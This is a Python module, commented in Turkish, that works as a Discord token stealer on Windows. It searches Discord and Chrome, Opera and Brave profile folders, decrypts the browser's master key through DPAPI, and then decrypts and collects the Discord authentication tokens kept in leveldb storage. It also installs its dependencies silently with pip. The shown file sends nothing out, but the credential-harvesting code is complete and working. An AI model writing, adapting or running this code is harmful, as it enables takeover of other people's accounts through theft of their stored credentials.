"""
Token toplama - SADECE token alır, API isteği YOK!
"""

import os
import re
import base64
import json
import subprocess
import sys

class FastTokenCollector:
    """Hızlı token toplayıcı - API isteği YAPMAZ"""
    
    def __init__(self):
        self.roaming = os.getenv("APPDATA", "")
        self.local = os.getenv("LOCALAPPDATA", "")
        
        # Sadece en yaygın Discord yolları
        self.discord_paths = [
            self.roaming + '\\discord',
            self.roaming + '\\discordptb',
            self.roaming + '\\discordcanary',
            self.local + '\\Google\\Chrome\\User Data\\Default',
            self.roaming + '\\Opera Software\\Opera Stable',
            self.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default'
        ]
        
        # Gerekli modülleri yükle (sadece Windows'ta)
        self._install_deps()
    
    def _install_deps(self):
        """Gerekli modülleri yükle - sessizce"""
        try:
            import win32crypt
            from Crypto.Cipher import AES
        except ImportError:
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", "pypiwin32", "pycryptodome"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            except:
                pass
    
    def _get_key(self, path):
        """Şifreleme anahtarını al"""
        try:
            local_state = os.path.join(path, "Local State")
            if not os.path.exists(local_state):
                return None
            
            with open(local_state, "r", encoding="utf-8") as f:
                data = json.load(f)
            
            encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # 'DPAPI' önekini kaldır
            
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except:
            return None
    
    def _decrypt_token(self, encrypted_token, key):
        """Token'ı çöz"""
        try:
            if not encrypted_token.startswith("dQw4w9WgXcQ:"):
                return encrypted_token
            
            from Crypto.Cipher import AES
            
            encrypted_data = base64.b64decode(encrypted_token.split("dQw4w9WgXcQ:")[1])
            nonce = encrypted_data[3:15]
            ciphertext = encrypted_data[15:-16]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt(ciphertext).decode("utf-8")
        except:
            return None
    
    def _scan_leveldb(self, path):
        """leveldb dosyalarını tara - SADECE token ara"""
        tokens = []
        leveldb = os.path.join(path, "Local Storage", "leveldb")
        
        if not os.path.exists(leveldb):
            return tokens
        
        # Şifreleme anahtarını al
        key = self._get_key(path)
        
        for file in os.listdir(leveldb):
            if not file.endswith(('.ldb', '.log')):
                continue
            
            try:
                with open(os.path.join(leveldb, file), 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    
                    # 1. Düz token'ları bul (MFA token)
                    # Format: [a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}
                    plain_tokens = re.findall(r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}', content)
                    tokens.extend(plain_tokens)
                    
                    # 2. Şifreli token'ları bul
                    encrypted_tokens = re.findall(r'dQw4w9WgXcQ:[^\s"\'<>]+', content)
                    
                    # Şifreli token'ları çöz
                    if key:
                        for enc_token in encrypted_tokens:
                            decrypted = self._decrypt_token(enc_token, key)
                            if decrypted and decrypted not in tokens:
                                tokens.append(decrypted)
            except:
                continue
        
        return tokens
    
    def get_tokens(self):
        """Tüm token'ları topla - SADECE token, API isteği YOK!"""
        all_tokens = []
        
        for path in self.discord_paths:
            if not os.path.exists(path):
                continue
            
            found = self._scan_leveldb(path)
            all_tokens.extend(found)
        
        # Tekrarlananları temizle
        return list(set(all_tokens))